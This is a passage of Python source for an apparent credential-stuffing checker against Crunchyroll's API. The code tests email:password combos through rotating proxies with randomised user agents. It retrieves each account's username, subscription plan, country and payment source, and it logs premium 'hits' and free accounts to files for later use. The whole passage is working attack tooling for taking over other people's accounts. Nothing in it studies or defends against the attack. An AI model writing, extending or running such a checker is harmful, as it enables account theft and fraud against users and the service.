            logger.warning(f"Details failed for {email}: {details_failure_reason}. Retrying internally.")
            counters[session_id]['retries'] += 1
            details_retry_count += 1
            time.sleep(3 + details_retry_count)
        except Exception as e:
            details_failure_reason = f"Unexpected exception: {str(e)}"
            logger.error(f"Details failed for {email}: {details_failure_reason}", exc_info=True)
            counters[session_id]['retries'] += 1
            details_retry_count += 1
            time.sleep(1)

    if not external_id:
        logger.warning(f"Failed to get external_id for {email} after {MAX_INTERNAL_API_RETRIES} internal retries. Re-queueing combo.")
        return "RETRY"

    username = "Unknown"
    profile_retry_count = 0
    last_profile_response_text = "N/A"
    profile_failure_reason = "Unknown"

    while profile_retry_count < MAX_INTERNAL_API_RETRIES:
        if not is_session_active(session_id) or counters[session_id]['is_paused']:
            return False

        try:
            profile_url = "https://beta-api.crunchyroll.com/accounts/v1/me/multiprofile"
            profile_headers = {
                "User-Agent": generate_random_user_agent(),
                "Pragma": "no-cache",
                "Accept": "*/*",
                "host": "beta-api.crunchyroll.com",
                "authorization": f"Bearer {access_token}",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": str(uuid.uuid4()),
                "accept-encoding": "gzip",
            }
            logger.debug(f"Profile request for {email} (Internal Retry: {profile_retry_count + 1}/{MAX_INTERNAL_API_RETRIES})")
            profile_response = session_req.get(profile_url, headers=profile_headers, proxies=proxies, timeout=15)
            last_profile_response_text = profile_response.text[:500]

            if profile_response.status_code == 200:
                profile_data = profile_response.text
                username_match = re.search(r'"username":"(.*?)"', profile_data)
                username = username_match.group(1) if username_match else "Unknown"
                break
            elif profile_response.status_code in [403, 406, 429, 500, 502, 503, 504]:
                profile_failure_reason = f"Server/Proxy error: {profile_response.status_code}"
                logger.warning(f"Profile failed for {email}: {profile_failure_reason}. Retrying internally. Response: {last_profile_response_text}")
            else:
                profile_failure_reason = f"Unexpected status code: {profile_response.status_code}"
                logger.warning(f"Profile failed for {email}: {profile_failure_reason}. Retrying internally. Response: {last_profile_response_text}")

            profile_retry_count += 1
            time.sleep(2 + profile_retry_count)

        except (ProxyError, ConnectionError, RequestException, Timeout, ReadTimeout) as e:
            profile_failure_reason = f"Network error: {type(e).__name__} - {str(e)}"
            logger.warning(f"Profile failed for {email}: {profile_failure_reason}. Retrying internally.")
            profile_retry_count += 1
            time.sleep(3 + profile_retry_count)
        except Exception as e:
            profile_failure_reason = f"Unexpected exception: {str(e)}"
            logger.error(f"Profile failed for {email}: {profile_failure_reason}", exc_info=True)
            profile_retry_count += 1
            time.sleep(1)

    if username == "Unknown" and profile_retry_count == MAX_INTERNAL_API_RETRIES:
        logger.warning(f"Failed to get username for {email} after {MAX_INTERNAL_API_RETRIES} internal retries. Re-queueing combo.")
        return "RETRY"

    benefits_retry_count = 0
    last_benefits_response_text = "N/A"
    benefits_failure_reason = "Unknown"

    while benefits_retry_count < MAX_INTERNAL_API_RETRIES:
        if not is_session_active(session_id) or counters[session_id]['is_paused']:
            return False

        try:
            benefits_url = f"https://beta-api.crunchyroll.com/subs/v1/subscriptions/{external_id}/benefits"
            benefits_headers = {
                "host": "beta-api.crunchyroll.com",
                "authorization": f"Bearer {access_token}",
                "x-datadog-sampling-priority": "0",
                "etp-anonymous-id": str(uuid.uuid4()),
                "accept-encoding": "gzip",
                "user-agent": generate_random_user_agent(),
            }
            logger.debug(f"Benefits request for {email} (Internal Retry: {benefits_retry_count + 1}/{MAX_INTERNAL_API_RETRIES})")
            benefits_response = session_req.get(benefits_url, headers=benefits_headers, proxies=proxies, timeout=15)
            last_benefits_response_text = benefits_response.text[:500]

            if benefits_response.status_code == 200 or benefits_response.status_code == 404:
                benefits_data = benefits_response.text

                country_match = re.search(r'"subscription_country":"(.*?)"', benefits_data)
                subscription_country = country_match.group(1) if country_match else "Unknown"
                country_full_name = country_translations.get(subscription_country, subscription_country)

                is_free = (benefits_response.status_code == 404 or
                          "subscription.not_found" in benefits_data or
                          "Subscription Not Found" in benefits_data or
                          "total\":0,\"" in benefits_data or
                          not "\"subscription_country\":\"" in benefits_data)

                if is_free:
                    logger.info(f"Free account found: {email}")
                    counters[session_id]['custom'] += 1
                    session_dir = f"session_{session_id}"
                    custom_file_path = f"{session_dir}/custom.txt"
                    with open(custom_file_path, 'a', encoding='utf-8') as custom_file:
                        custom_file.write(f"{email}:{password} | USER = {username} | MAIL VERIFIED = {email_verified}\n")

                else:
                    logger.info(f"Premium account found: {email}")
                    counters[session_id]['hits'] += 1

                    plan_type = ""
                    max_streams = ""

                    benefit_match = re.search(r'"benefit":"concurrent_streams\.(\d+)"', benefits_data)
                    if benefit_match:
                        streams_value = benefit_match.group(1)

                        if streams_value == "6":
                            plan_type = "⟪ULTIMATE FAN MEMBER⟫-[cr_premium_plus]"
                            max_streams = "6"
                            counters[session_id]['total_ultimate_mega'] += 1
                        elif streams_value == "4":
                            plan_type = "⟪MEGA FAN MEMBER⟫-[cr_fan_pack]"
                            max_streams = "4"
                            counters[session_id]['total_mega_fan'] += 1
                        elif streams_value == "1":
                            plan_type = "⟪FAN MEMBER⟫-[cr_premium]"
                            max_streams = "1"
                            counters[session_id]['total_fan_member'] += 1
                        else:
                            plan_type = f"⟪UNKNOWN ({streams_value})⟫"
                            max_streams = streams_value
                    else:
                        plan_type = "⟪UNKNOWN⟫"
                        max_streams = "Unknown"

                    payment_match = re.search(r'"source":"(.*?)"', benefits_data)
                    payment_method = f"⟪ {payment_match.group(1) if payment_match else ''} ⟫"

                    hit_format = f"{email}:{password} | USER = {username} | MAIL VERIFIED = {email_verified} | COUNTRY = {country_full_name} | PLAN(SUB) = {plan_type} | MAX STREAMS = {max_streams} | PAYMENT METHOD = {payment_method}."

                    session_dir = f"session_{session_id}"
                    hit_file_path = f"{session_dir}/hits.txt"
                    with open(hit_file_path, 'a', encoding='utf-8') as hit_file:
                        hit_file.write(f"{hit_format}\n")

                return "CHECKED"
            elif benefits_response.status_code in [403, 406, 429, 500, 502, 503, 504]:
                benefits_failure_reason = f"Server/Proxy error: {benefits_response.status_code}"
                logger.warning(f"Benefits failed for {email}: {benefits_failure_reason}. Retrying internally. Response: {last_benefits_response_text}")
            else:
                benefits_failure_reason = f"Unexpected status code: {benefits_response.status_code}"
                logger.warning(f"Benefits failed for {email}: {benefits_failure_reason}. Retrying internally. Response: {last_benefits_response_text}")

            benefits_retry_count += 1
            time.sleep(2 + benefits_retry_count)

        except (ProxyError, ConnectionError, RequestException, Timeout, ReadTimeout) as e:
            benefits_failure_reason = f"Network error: {type(e).__name__} - {str(e)}"
            logger.warning(f"Benefits failed for {email}: {benefits_failure_reason}. Retrying internally.")
            counters[session_id]['retries'] += 1
            benefits_retry_count += 1
            time.sleep(3 + benefits_retry_count)
        except Exception as e:
            benefits_failure_reason = f"Unexpected exception: {str(e)}"
            logger.error(f"Benefits failed for {email}: {benefits_failure_reason}", exc_info=True)
            counters[session_id]['retries'] += 1
            benefits_retry_count += 1
            time.sleep(1)

    logger.warning(f"Benefits check failed for {email} after {MAX_INTERNAL_API_RETRIES} internal retries. Re-queueing combo.")
    return "RETRY"


def generate_stats_text(session_id):
    if session_id not in counters:
        return {
            'status': '❌ STOPPED',
            'total_lines': 0,
            'checked': 0,
            'invalid': 0,
            'hits': 0,
            'custom': 0,
            'total_mega_fan': 0,
            'total_fan_member': 0,
            'total_ultimate_mega': 0,
            'errors': 0,
            'retries': 0,
            'cpm': 0,
            'elapsed_time': '0:00:00'
        }

    data = counters[session_id]

    status_text = "❌ STOPPED"
    if data['is_running']:
        if data['is_paused']:
            status_text = "⏸️ PAUSED"
        else:
            status_text = "🔄 RUNNING"
    elif data.get('completed', False):
        status_text = "✅ COMPLETE"

    if data.get('completed', False) or not data['is_running']:
        if data.get('end_time'):
            elapsed_time = data['end_time'] - data['start_time']
        else:
            elapsed_time = datetime.now() - data['start_time']
    else:
        elapsed_time = datetime.now() - data['start_time']

    elapsed_str = str(timedelta(seconds=int(elapsed_time.total_seconds())))

    cpm = 0
    if elapsed_time.total_seconds() > 0:
        cpm = int((data['checked'] / elapsed_time.total_seconds()) * 60)

    return {
        'status': status_text,
        'total_lines': data['total_lines'],
        'checked': data['checked'],
        'invalid': data['invalid'],
        'hits': data['hits'],
        'custom': data.get('custom', 0),
        'total_mega_fan': data.get('total_mega_fan', 0),
        'total_fan_member': data.get('total_fan_member', 0),
        'total_ultimate_mega': data.get('total_ultimate_mega', 0),
        'errors': data['errors'],
        'retries': data.get('retries', 0),
        'cpm': cpm,
        'elapsed_time': elapsed_str
    }

def clean_session_directory(session_id):
    directory = f"session_{session_id}"
    if os.path.exists(directory):
        hits_file = f"{directory}/hits.txt"
        custom_file = f"{directory}/custom.txt"

        backup_dir = f"{directory}/backup"
        if not os.path.exists(backup_dir):
            os.makedirs(backup_dir)

        if os.path.exists(hits_file) and os.path.getsize(hits_file) > 0:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            backup_file = f"{backup_dir}/hits_{timestamp}.txt"
            shutil.copy2(hits_file, backup_file)

        if os.path.exists(custom_file) and os.path.getsize(custom_file) > 0:
            timestamp = time.strftime("%Y%m%d-%H%M%S")
            backup_file = f"{backup_dir}/custom_{timestamp}.txt"
            shutil.copy2(custom_file, backup_file)

        for filename in os.listdir(directory):
            file_path = os.path.join(directory, filename)
            if filename != "backup" and os.path.isfile(file_path):
                try:
                    os.remove(file_path)
                except PermissionError:
                    logger.warning(f"PermissionError: Could not delete {file_path}. It may be in use.")
